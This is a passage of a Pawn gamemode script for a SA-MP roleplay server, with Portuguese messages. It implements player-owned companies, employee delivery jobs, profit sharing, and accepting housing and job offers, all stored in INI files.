						format(EmpresaInfo[m][Funcionario3], 24, "Ninguem");
						WE_SetString(str, "Funcionario3", "Ninguem");
						WE_SetInt(str, "Producao3", 0);
						WE_SetInt(str, "P3Atual", 0);
			       	}
			       	return 1;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "trabalhar", true))
  		{
            for(new m = 0; m < MAX_EMPRESAS; ++m)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
                {
					new
					    get_empresa = WE_GetInt(f(playerid), "EmpresaID")
					;
					if(get_empresa > 0 && get_empresa != EmpresaInfo[m][Numero])
					{
					    SendClientMessage(playerid, COR_ERRO, "Você é dono(a) de uma empresa, portanto não pode trabalhar em outras empresas!");
					    return 1;
					}
                	if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você é dono(a) desta empresa somente funcinários trabalham!");
						return 1;
					}
                 	if(strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é funcionário(a) desta empresa!");
						return 1;
					}

					format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

	    			if(!strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false))
				    {
				        new
				            p_producao_tempo = WE_GetInt(gStr, "P1Time")
						;
						if(p_producao_tempo > gettime())
						{
						    new
								s_hora_minuto[64]
							;
    						rHoraMinuto((p_producao_tempo - gettime()), s_hora_minuto, sizeof(s_hora_minuto));

							SendClientMessage(playerid, COR_ERRO, "Você precisa aguardar um tempo para próxima produção!");
	    					format(gStr, 128, "Próxima produção somente daqui à %s", s_hora_minuto);
							SendClientMessage(playerid, COR_ERRO, gStr);
       						return 1;
						}
					}
				    else if(!strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false))
				    {
				        new
				            p_producao_tempo = WE_GetInt(gStr, "P2Time")
						;
						if(p_producao_tempo > gettime())
						{
						    new
								s_hora_minuto[64]
							;
    						rHoraMinuto((p_producao_tempo - gettime()), s_hora_minuto, sizeof(s_hora_minuto));

							SendClientMessage(playerid, COR_ERRO, "Você precisa aguardar um tempo para próxima produção!");
	    					format(gStr, 128, "Próxima produção somente daqui à %s", s_hora_minuto);
							SendClientMessage(playerid, COR_ERRO, gStr);
       						return 1;
						}
					}
				    else if(!strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
				    {
				        new
				            p_producao_tempo = WE_GetInt(gStr, "P3Time")
						;
						if(p_producao_tempo > gettime())
						{
						    new
								s_hora_minuto[64]
							;
    						rHoraMinuto((p_producao_tempo - gettime()), s_hora_minuto, sizeof(s_hora_minuto));

							SendClientMessage(playerid, COR_ERRO, "Você precisa aguardar um tempo para próxima produção!");
	    					format(gStr, 128, "Próxima produção somente daqui à %s", s_hora_minuto);
							SendClientMessage(playerid, COR_ERRO, gStr);
       						return 1;
						}
					}
					if(bateu_ponto[playerid] > 0)
					{
					    SendClientMessage(playerid, COR_ERRO, "Você já iniciou o trabalho!");
					    SendClientMessage(playerid, COR_ERRO, "Você deve ir até a àrea de descarga de caminhoneiros para pegar a mercadoria!");
					    return 1;
					}
					format(gStr, 128, "%s você iniciou o trabalho.", PlayerName(playerid));
					SendClientMessage(playerid, COR_AMARELO, gStr);
					SendClientMessage(playerid, AZUL_WE, "Vá até a área de carga dos transportadores localizada no porto de San Fierro.");
					SendClientMessage(playerid, AZUL_WE, "A empresa de cargas idicará qual empresa você deverá fazer a entrega.");
					bateu_ponto[playerid] = 2000;
				}
			}
			return 1;
		}
		else if(!strcmp(tmp, "baixaentrega", true))
  		{
            for(new m = 0; m < MAX_EMPRESAS; ++m)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
                {
                	if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), true))
					{
						SendClientMessage(playerid, COR_ERRO, "Você é dono desta empresa somente funcinários trabalham!");
						return 1;
					}
                 	if(strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false) && strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é funcionário(a) desta empresa!");
						return 1;
					}
					if(bateu_ponto1[playerid] != 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não fez uma entrega!");
					    SendClientMessage(playerid, COR_ERRO, "Você deve fazer uam entrega para poder dar baixa na mesma!");
					    return 1;
					}
					format(gStr, 128, "%s você deu baixa na entrega feita para empresa ID %d.", PlayerName(playerid), bateu_ponto[playerid]);
					SendClientMessage(playerid, COR_AMARELO, gStr);

                    format(gStr, 128, "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

				    if(!strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), false))
				    {
				        new
							total_entregas = WE_GetInt(gStr, "Producao1"),
							total_ereceber = WE_GetInt(gStr, "P1Atual")
						;
						WE_SetInt(gStr, "Producao1", (total_entregas + 1));
						WE_SetInt(gStr, "P1Atual", (total_ereceber + 1));

                        WE_SetInt(gStr, "P1Time", (gettime()+7200));

						format(gStr, 128, "{FFFFFF}%s {9CF071}você completou uma tarefa e soma mais uma produção!", PlayerName(playerid));
						SendClientMessage(playerid, 0x9CF071FF, gStr);

						format(gstring, 256, "A empresa de {FFFFFF}%s, %s ID %d soma suas produções:", EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
						SendClientMessage(playerid, COR_AMARELO, gstring);

						format(gStr, 128, "Produção atual: %d - Produção total: %d", (total_ereceber + 1), (total_entregas + 1));
						SendClientMessage(playerid, 0x9CF071FF, gStr);
				    }
				    else if(!strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), false))
				    {
				        new
							total_entregas = WE_GetInt(gStr, "Producao2"),
							total_ereceber = WE_GetInt(gStr, "P2Atual")
						;
						WE_SetInt(gStr, "Producao2", (total_entregas + 1));
						WE_SetInt(gStr, "P2Atual", (total_ereceber + 1));

                        WE_SetInt(gStr, "P2Time", (gettime()+7200));

						format(gStr, 128, "{FFFFFF}%s {9CF071}você completou uma tarefa e soma mais uma produção!", PlayerName(playerid));
						SendClientMessage(playerid, 0x9CF071FF, gStr);

						format(gstring, 256, "A empresa de {FFFFFF}%s, %s ID %d soma suas produções:", EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
						SendClientMessage(playerid, COR_AMARELO, gstring);

						format(gStr, 128, "Produção atual: %d - Produção total: %d", (total_ereceber + 1), (total_entregas + 1));
						SendClientMessage(playerid, 0x9CF071FF, gStr);
				    }
				    else if(!strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), false))
				    {
				        new
							total_entregas = WE_GetInt(gStr, "Producao3"),
							total_ereceber = WE_GetInt(gStr, "P3Atual")
						;
						WE_SetInt(gStr, "Producao3", (total_entregas + 1));
						WE_SetInt(gStr, "P3Atual", (total_ereceber + 1));

						WE_SetInt(gStr, "P3Time", (gettime()+7200));

						format(gStr, 128, "{FFFFFF}%s {9CF071}você completou uma tarefa e soma mais uma produção!", PlayerName(playerid));
						SendClientMessage(playerid, 0x9CF071FF, gStr);

						format(gstring, 256, "A empresa de {FFFFFF}%s, %s ID %d soma suas produções:", EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
						SendClientMessage(playerid, COR_AMARELO, gstring);

						format(gStr, 128, "Produção atual: %d - Produção total: %d", (total_ereceber + 1), (total_entregas + 1));
						SendClientMessage(playerid, 0x9CF071FF, gStr);
				    }
				    GameTextForPlayer(playerid, "~b~~h~+1 producao!", 2000, 1);

					bateu_ponto[playerid] = -1;
					bateu_ponto1[playerid] = 0;
				}
			}
			return 1;
		}
     	else if(!strcmp(tmp, "lucro", true))
  		{
            for(new m = 0; m < MAX_EMPRESAS; ++m)
            {
                if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
                {
                 	if(strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta empresa!");
						SendClientMessage(playerid, COR_ERRO, "No momento somente o(a) dono(a) desta empresa pode retirar o lucro!");
						SendClientMessage(playerid, COR_ERRO, "Lembrando que você recebe online ou offline a sua parte do lucro!");
						return 1;
					}
					else
					{
					    format(str, sizeof(str), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);

				      	new // Lucro Total P1
							int_lucrot_pd1,
     						// Lucro Atual P2
							int_lucroa_pd1,
							//
							// Lucro Total
							int_lucrot_pd2,
							// Lucro Atual
							int_lucroa_pd2,
							//
							// Lucro Total
							int_lucrot_pd3,
							// Lucro Atual
							int_lucroa_pd3
						;
						new
							// Total P1
							totalt_lucro_pd1,
							// Atual P1
							totala_lucro_pd1,
							//
							// Total P2
							totalt_lucro_pd2,
							// Atual P2
							totala_lucro_pd2,
							//
							// Total P3
							totalt_lucro_pd3,
							// Atual P3
							totala_lucro_pd3
						;

					    if(!strcmp(EmpresaInfo[m][Proprietario], PlayerName(playerid), true))
					    {
					    	new
						        stg[1500]
							;
							format(gStr, 128, "{FFFF00}Lucro Empresa {FFFFFF}ID %d  {FFFF00}%s", EmpresaInfo[m][Numero], EmpresaInfo[m][NomeEmp]);
							strcat(stg, gStr);

							format(gStr, 128, "\n{FFFFFF}Lucro do proprietário {31FFF0}%s", EmpresaInfo[m][NomeEmpresa], EmpresaInfo[m][Proprietario]);
					        strcat(stg, gStr);

					        if(!strcmp(EmpresaInfo[m][Funcionario1], "Ninguem", true))
					        {
						        format(gStr, 128, "\n\n{FFFFFF}{FF1E1E} Funcionário(a) 1 {FFFFFF}Vaga livre.\n\t{FF0000}Sem lucros!");
						        strcat(stg, gStr);
					        }
					        else
					        {
						        new	// Porcentagem de Lucro por Mercadoria
                                    lucro_pd1_porcento = (EmpresaInfo[m][Preco] * 1 / 75)
								;

								// Lucro Total P1
								int_lucrot_pd1 = WE_GetInt(str, "Producao1"),
	                    		// Lucro Atual P2
	                          	int_lucroa_pd1 = WE_GetInt(str, "P1Atual");

				    			// Total
				   				totalt_lucro_pd1 = int_lucrot_pd1 * lucro_pd1_porcento,
				   				// Atual
				   				totala_lucro_pd1 = int_lucroa_pd1 * lucro_pd1_porcento;

								format(gStr, 128, "\n\n{FF1E1E} Funcionário(a) 1 {FFFFFF}%s\n\t Prod Total %d\n\t Prod Atual %d", EmpresaInfo[m][Funcionario1], int_lucrot_pd1, int_lucroa_pd1);
						        strcat(stg, gStr);

						        format(gStr, 128, "\n{FFFFFF} Lucro Total P1 R$%d - Lucro Atual: R$%d", totalt_lucro_pd1, (totala_lucro_pd1 / 2));
						        strcat(stg, gStr);

					            if(int_lucroa_pd1 > 0)
					            {
							      	if(pConectadoa(EmpresaInfo[m][Funcionario1]))
									{
									    new
									        id_f1 = pConectadoID(EmpresaInfo[m][Funcionario1])
										;
										GameTextForPlayer(id_f1, "~w~+ ~g~lucro empresa!", 2000, 1);
										format(gstring, 128, " %s (seu/sua patrão/patroa) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario1], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
										SendClientMessage(id_f1, COR_AMARELO, gstring);
										format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", int_lucroa_pd1, int_lucrot_pd1);
										SendClientMessage(id_f1, COR_BRANCO, gstring);
										format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", (totala_lucro_pd1 / 2));
										SendClientMessage(id_f1, COR_BRANCO, gstring);
										SendClientMessage(id_f1, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
			 							sGivePlayerCash(id_f1, (totala_lucro_pd1 / 2));
									}
									else
									{
									    format(pFile, 128, "Contas/%s.ini", EmpresaInfo[m][Funcionario1]);
									    WE_SetInt(pFile, "atualprod", int_lucroa_pd1);
			 							WE_SetInt(pFile, "msglucro", 1);
			 							WE_SetInt(pFile, "qtdlucro", (totala_lucro_pd1 / 2));
									}
									sGivePlayerCash(playerid, (totala_lucro_pd1 / 2));
									//
									WE_SetInt(str, "P1Atual", 0);
					            }
							}

       						if(!strcmp(EmpresaInfo[m][Funcionario2], "Ninguem", true))
					        {
						        format(gStr, 128, "\n\n{FFFFFF}>{FF1E1E} Funcionário(a) 2 {FFFFFF}Vaga livre.\n\t{FF0000}Sem lucros!");
						        strcat(stg, gStr);
					        }
					        else
					        {
						        new	// Porcentagem de Lucro por Mercadoria
                                    lucro_pd2_porcento = (EmpresaInfo[m][Preco] * 1 / 75)
								;

								// Lucro Total
								int_lucrot_pd2 = WE_GetInt(str, "Producao2"),
      							// Lucro Atual
             					int_lucroa_pd2 = WE_GetInt(str, "P2Atual");

								// Total
	   							totalt_lucro_pd2 = int_lucrot_pd2 * lucro_pd2_porcento,
				   				// Atual
				   				totala_lucro_pd2 = int_lucroa_pd2 * lucro_pd2_porcento;

								format(gStr, 128, "\n\n{FFFFFF}>{FF1E1E} Funcionário(a) 2 {FFFFFF}%s\n\tProd Total %d\n\tProd Atual %d", EmpresaInfo[m][Funcionario2], int_lucrot_pd2, int_lucroa_pd2);
						        strcat(stg, gStr);

						        format(gStr, 128, "\n{FFFFFF} Lucro Total P2 R$%d - Lucro Atual: R$%d", totalt_lucro_pd2, (totala_lucro_pd2 / 2));
						        strcat(stg, gStr);

                                if(int_lucroa_pd2 > 0)
                                {
							      	if(pConectadoa(EmpresaInfo[m][Funcionario2]))
									{
									    new
									        id_f2 = pConectadoID(EmpresaInfo[m][Funcionario2])
										;
										GameTextForPlayer(id_f2, "~w~+ ~g~lucro empresa!", 2000, 1);
										format(gstring, 128, " %s (seu/sua patrão/patroa) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario2], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
										SendClientMessage(id_f2, COR_AMARELO, gstring);
										format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", int_lucroa_pd2, int_lucrot_pd2);
										SendClientMessage(id_f2, COR_BRANCO, gstring);
										format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", (totala_lucro_pd2 / 2));
										SendClientMessage(id_f2, COR_BRANCO, gstring);
										SendClientMessage(id_f2, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
			 							sGivePlayerCash(id_f2, (totala_lucro_pd2 / 2));
									}
									else
									{
									    format(pFile, 128, "Contas/%s.ini", EmpresaInfo[m][Funcionario2]);
									    WE_SetInt(pFile, "atualprod", int_lucroa_pd2);
			 							WE_SetInt(pFile, "msglucro", 1);
			 							WE_SetInt(pFile, "qtdlucro", (totala_lucro_pd2 / 2));
									}
									sGivePlayerCash(playerid, (totala_lucro_pd2 / 2));
									//
									WE_SetInt(str, "P2Atual", 0);
								}
							}
 							if(!strcmp(EmpresaInfo[m][Funcionario3], "Ninguem", true))
					        {
						        format(gStr, 128, "\n\n{FFFFFF}>{FF1E1E} Funcionário(a) 3 {FFFFFF}Vaga livre.\n\t{FF0000}Sem lucros!");
						        strcat(stg, gStr);
					        }
					        else
					        {
						        new	// Porcentagem de Lucro por Mercadoria
                                    lucro_pd3_porcento = (EmpresaInfo[m][Preco] * 1 / 75)
								;

								// Lucro Total
								int_lucrot_pd3 = WE_GetInt(str, "Producao3"),
                              	// Lucro Atual
                            	int_lucroa_pd3 = WE_GetInt(str, "P3Atual");

				    			// Total
				   				totalt_lucro_pd3 = int_lucrot_pd3 * lucro_pd3_porcento,
				   				// Atual
				   				totala_lucro_pd3 = int_lucroa_pd3 * lucro_pd3_porcento;

								format(gStr, 128, "\n\n{FFFFFF}>{FF1E1E} Funcionário(a) 3 {FFFFFF}%s\n\tProd Total %d\n\tProd Atual %d", EmpresaInfo[m][Funcionario3], int_lucrot_pd3, int_lucroa_pd3);
						        strcat(stg, gStr);

						        format(gStr, 128, "\n{FFFFFF} Lucro Total P3 R$%d - Lucro Atual: R$%d", totalt_lucro_pd3, (totala_lucro_pd3 / 2));
						        strcat(stg, gStr);

						        if(int_lucroa_pd3 > 0)
						        {
							      	if(pConectadoa(EmpresaInfo[m][Funcionario3]))
									{
									    new
									        id_f3 = pConectadoID(EmpresaInfo[m][Funcionario3])
										;
										GameTextForPlayer(id_f3, "~w~+ ~g~lucro empresa!", 2000, 1);
										format(gstring, 128, " %s (seu/sua patrão/patroa) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario3], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], EmpresaInfo[m][Numero]);
										SendClientMessage(id_f3, COR_AMARELO, gstring);
										format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", int_lucroa_pd3, int_lucrot_pd3);
										SendClientMessage(id_f3, COR_BRANCO, gstring);
										format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", (totala_lucro_pd3 / 2));
										SendClientMessage(id_f3, COR_BRANCO, gstring);
										SendClientMessage(id_f3, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
			 							sGivePlayerCash(id_f3, (totala_lucro_pd3 / 2));
									}
									else
									{
									    format(pFile, 128, "Contas/%s.ini", EmpresaInfo[m][Funcionario3]);
									    WE_SetInt(pFile, "atualprod", int_lucroa_pd3);
			 							WE_SetInt(pFile, "msglucro", 1);
			 							WE_SetInt(pFile, "qtdlucro", (totala_lucro_pd3 / 2));
									}
									sGivePlayerCash(playerid, (totala_lucro_pd3 / 2));
									//
									WE_SetInt(str, "P3Atual", 0);
								}
							}
							new
							    l_t_a = ((totala_lucro_pd1 / 2) + (totala_lucro_pd2 / 2) + (totala_lucro_pd3 / 2))
							;
							format(gStr, 128, "\n\n{FFFFFF}{83FF57} Lucro total recebido agora R$%d", l_t_a);
						   	strcat(stg, gStr);
							new
							    l_t_e = (int_lucrot_pd1 + int_lucrot_pd2 + int_lucrot_pd3) * (EmpresaInfo[m][Preco] * 1 / 100)
							;
							format(gStr, 128, "\n{FFFFFF}{FFFF00} Lucro total da empresa R$%d\n", l_t_e);
						   	strcat(stg, gStr);

							ShowPlayerDialog(playerid, D_EMPRINFO, DIALOG_STYLE_MSGBOX, "{FFFFFF} Empresa Lucro", stg, "OK", "");
					    }
					}
				}
			}
			return 1;
		}
	}
	if(!strcmp(cmdtext, "/mercadoria", true))
	{
	    new
	        contratado_id = WE_GetInt(f(playerid), "Contratado")
		;
	    if(contratado_id > 0)
	    {
        	if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1737.9591, 24.8926, 3.5547))
  		    {
  		        SendClientMessage(playerid, COR_ERRO, "Você não está na àrea de transportes, no porto de San Fierro!");
  		        return 1;
  		    }
			if(bateu_ponto[playerid] <= 0)
			{
   				SendClientMessage(playerid, COR_ERRO, "Você não iniciou o trabalho na empresa que você trabalha!");
			    return 1;
			}
			if(bateu_ponto[playerid] != 2000 && bateu_ponto[playerid] > 0)
			{
   				SendClientMessage(playerid, COR_ERRO, "Você já pegou a mercadoria!");
	   			format(gStr, 128, "%s você pegou a mercadoria.", PlayerName(playerid));
				SendClientMessage(playerid, COR_AMARELO, gStr);
				format(gStr, 128, "%s você deve entregar a mercadoria na empresa {FFFFFF}ID %d.", PlayerName(playerid), bateu_ponto[playerid]);
				SendClientMessage(playerid, COR_AMARELO, gStr);
			    return 1;
			}
			GameTextForPlayer(playerid, "~y~~h~entregue a mercadoria.", 2000, 1);
			new
		  		empresa_id = minrand(1, MAX_EMPRESAS)
			;
			if(empresa_id == contratado_id || empresa_id == 52)
			{
			    SendClientMessage(playerid, COR_ERRO, "Utilize o comando novamente!");
			    return 1;
			}
			bateu_ponto[playerid] = empresa_id;
			format(gStr, 128, "%s você pegou a mercadoria.", PlayerName(playerid));
			SendClientMessage(playerid, COR_AMARELO, gStr);
			new
				zone[MAX_ZONE_NAME],
				Cidade[MAX_ZONE_NAME],
	 			m = bateu_ponto[playerid]
			;
			GetEmpresa2DZone(m, zone, MAX_ZONE_NAME);
			GetEmpresa2DCidade(m, Cidade, MAX_ZONE_NAME);

			if(!strcmp(EmpresaInfo[m][Proprietario], "Ninguem", true))
			{
				format(gstring, 256, "Você deve entregar a mercadoria na empresa {FFFFFF}%s ID %d que não possui dono(a).",  EmpresaInfo[m][NomeEmp], empresa_id);
				SendClientMessage(playerid, COR_AMARELO, gstring);
				format(gstring, 256, "A empresa se localiza em {FFFFFF}%s {FFF17C}na cidade de {FFFFFF}%s.", zone, Cidade);
				SendClientMessage(playerid, 0xFFF17CFF, gstring);
			}
			else
			{
 				format(gstring, 256, "Você deve entregar a mercadoria na empresa {FFFFFF}%s ID %d que pertence à %s", EmpresaInfo[m][NomeEmp], empresa_id, EmpresaInfo[m][Proprietario]);
				SendClientMessage(playerid, COR_AMARELO, gstring);
				format(gstring, 256, "A empresa se localiza em {FFFFFF}%s {FFF17C}na cidade de {FFFFFF}%s.", zone, Cidade);
				SendClientMessage(playerid, 0xFFF17CFF, gstring);
			}
			SendClientMessage(playerid, COR_BRANCO, "Siga o ícone com a letra D que foi colocado em seu mapa.");
			SendClientMessage(playerid, COR_BRANCO, "Ao achar digite: {FFFF00}/MercadoriaEntregar");
			RemovePlayerMapIcon(playerid, 90);
	    	SetPlayerMapIcon(playerid, 90, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 24,0,MAPICON_GLOBAL_CHECKPOINT);
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é funcionário(a) de nenhuma empresa!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/mercadoriaentregar", true))
	{
			if(bateu_ponto[playerid] <= 0)
			{
   				SendClientMessage(playerid, COR_ERRO, "Você não iniciou o trabalho na empresa que você trabalha e não pegou a mercadoria!");
			    return 1;
			}
  		  	new
			  	m = bateu_ponto[playerid]
		  	;
  		    if(!IsPlayerInRangeOfPoint(playerid, 2.0, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
  		    {
  		        format(gStr, 128, "Você não está na empresa ID %d!", m);
  		        SendClientMessage(playerid, COR_ERRO, gStr);
  		        return 1;
  		    }
  		    if(bateu_ponto1[playerid] == 1)
  		    {
  		        SendClientMessage(playerid, COR_ERRO, "Você já entregou a mercadoria!");
  		        format(gStr, 128, "%s você deve voltar para empresa que você trabalha para dar baixa na entrega.", PlayerName(playerid));
				SendClientMessage(playerid, COR_AMARELO, gStr);
  		        return 1;
  		    }
			if(bateu_ponto[playerid] == 2000)
			{
   				SendClientMessage(playerid, COR_ERRO, "Você não pegou a mercadoria na àrea de descarga de caminhoneiros em Las Venturas!");
			    return 1;
			}
			GameTextForPlayer(playerid, "~b~~h~mercadoria entregue.", 2000, 1);

			bateu_ponto1[playerid] = 1;

			format(gStr, sizeof(gStr), "Empresas/Empresa%d.ini", EmpresaInfo[m][Numero]);
			new
				recebidos_atual = WE_GetInt(gStr, "PRecebidas")
			;
			WE_SetInt(gStr, "PRecebidas", (recebidos_atual + 1));

			format(gStr, 128, "{FFFFFF}%s {FFFF00}você entregou a mercadoria.", PlayerName(playerid));
			SendClientMessage(playerid, COR_AMARELO, gStr);

			SendClientMessage(playerid, COR_AMARELO, "Você deve voltar para empresa que você trabalha para dar baixa na entrega.");
			SendClientMessage(playerid, COR_BRANCO, "Ao chegar a empresa que você trabalha digite: {FFFF00}/Empresa BaixaEntrega");

            RemovePlayerMapIcon(playerid, 90);

			return 1;
	}
	if(!strcmp(cmd, "/aceitar", true))
    {
  		if(AceitarMorador[playerid] > 0)
  		{
  		    if(!IsPlayerConnected(MoradorCasaID[playerid]))
  		    {
  		        SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que ofereceu moradia para você desconectou-se!");
  		        return 1;
  		    }
  		    KillTimer(T_Morador[playerid]);
  		    format(gStr, sizeof(gStr), "%s aceitou morar em sua casa.", PlayerName(playerid));
  		    SendClientMessage(MoradorCasaID[playerid], COR_AMARELO, gStr);
  		    format(gstring, sizeof(gstring), "Você aceitou morar com %s", PlayerName(MoradorCasaID[playerid]));
  		    SendClientMessage(playerid, COR_AMARELO, gstring);
		 	format(hFile, sizeof(hFile), "Casas/casa%d.ini", AceitarMorador[playerid]);
		 	if(!strcmp(CasaInfo[AceitarMorador[playerid]][Morador], "Ninguem", true))
		 	{
	            format(CasaInfo[AceitarMorador[playerid]][Morador], 24, PlayerName(playerid));
	            WE_SetString(hFile, "Morador", PlayerName(playerid));
			}
			else if(!strcmp(CasaInfo[AceitarMorador[playerid]][Morador2], "Ninguem", true))
		 	{
	            format(CasaInfo[AceitarMorador[playerid]][Morador2], 24, PlayerName(playerid));
	            WE_SetString(hFile, "Morador2", PlayerName(playerid));
			}
			else if(!strcmp(CasaInfo[AceitarMorador[playerid]][Morador3], "Ninguem", true))
		 	{
	            format(CasaInfo[AceitarMorador[playerid]][Morador3], 24, PlayerName(playerid));
	            WE_SetString(hFile, "Morador3", PlayerName(playerid));
			}
			WE_SetInt(f(playerid), "MorandoID", AceitarMorador[playerid]);
			MoradorCasaID[playerid] = 0;
			AceitarMorador[playerid] = 0;
			pInfo[playerid][Spawn] = 1;
			return 1;
  		}
		if(AceitarContrato[playerid] == 1)
  		{
  		    ContratoMsg[playerid] = 0;
  		    AceitarContrato[playerid] = 0;
  		    KillTimer(T_Contratado[playerid]);
  		    if(!IsPlayerConnected(DonoEmpresa[playerid]))
  		    {
  		        SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que lhe ofereceu trabalho desconectou-se do servidor.");
                DonoEmpresa[playerid] = -1;
				return 1;
			}
  			format(gStr, sizeof(gStr), "Contas/%s.ini", PlayerName(playerid));
			format(pFile, sizeof(pFile), "Contas/%s.ini", PlayerName(DonoEmpresa[playerid]));
		 	format(gstring, sizeof(gstring), "Empresas/Empresa%d.ini", WE_GetInt(pFile, "EmpresaID"));

		 	WE_SetInt(gStr, "Contratado", WE_GetInt(pFile, "EmpresaID"));

		 	if(!strcmp(WE_GetString(gstring, "Funcionario1"), "Ninguem", true))
		 	{
	            format(EmpresaInfo[WE_GetInt(pFile, "EmpresaID")][Funcionario1], 24, PlayerName(playerid));
	            WE_SetString(gstring, "Funcionario1", PlayerName(playerid));
			}
			else if(!strcmp(WE_GetString(gstring, "Funcionario2"), "Ninguem", true))
		 	{
	            format(EmpresaInfo[WE_GetInt(pFile, "EmpresaID")][Funcionario2], 24, PlayerName(playerid));
	            WE_SetString(gstring, "Funcionario2", PlayerName(playerid));
			}
			else if(!strcmp(WE_GetString(gstring, "Funcionario3"), "Ninguem", true))
		 	{
	            format(EmpresaInfo[WE_GetInt(pFile, "EmpresaID")][Funcionario3], 24, PlayerName(playerid));
	            WE_SetString(gstring, "Funcionario3", PlayerName(playerid));
			}
			format(gstring, sizeof(gstring), "Você aceitou trabalhar na empresa do(a) jogador(a) {FFFFFF}%s", PlayerName(DonoEmpresa[playerid]));
		 	SendClientMessage(playerid, COR_AMARELOCLARO, gstring);
			format(gstring, sizeof(gstring), "O(A) jogador(a) %s aceitou o contrato para trabalhar em sua empresa!", PlayerName(playerid));
		 	SendClientMessage(DonoEmpresa[playerid], 0xFFD39BAA, gstring);
		 	DonoEmpresa[playerid] = -1;
			return 1;
  		}
     	/*if(msgconvi[playerid] == 1)
        {
            KillTimer(timercou[playerid]);
    		format(gFile, sizeof(gFile), "clans/%s.ini", playerClan[convidou[playerid]]);
    		format(gstring, sizeof(gstring), "clans/%s.ini", PlayerName(playerid));
            if(!fexist(gstring))
            {
                WE_CreateFile(gstring);
                WE_SetString(gstring, "cla", playerClan[convidou[playerid]]);
            }
            format(playerClan[playerid], MAX_PLAYER_NAME+1, playerClan[convidou[playerid]]);
            clanColor[playerid] = clanColor[convidou[playerid]];
			if(!strcmp(WE_GetString(gFile, "Membro1"), "Ninguem", true)) { WE_SetString(gFile, "Membro1", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro2"), "Ninguem", true)) { WE_SetString(gFile, "Membro2", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro3"), "Ninguem", true)) { WE_SetString(gFile, "Membro3", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro4"), "Ninguem", true)) { WE_SetString(gFile, "Membro4", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro5"), "Ninguem", true)) { WE_SetString(gFile, "Membro5", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro6"), "Ninguem", true)) { WE_SetString(gFile, "Membro6", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro7"), "Ninguem", true)) { WE_SetString(gFile, "Membro7", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro8"), "Ninguem", true)) { WE_SetString(gFile, "Membro8", PlayerName(playerid)); }
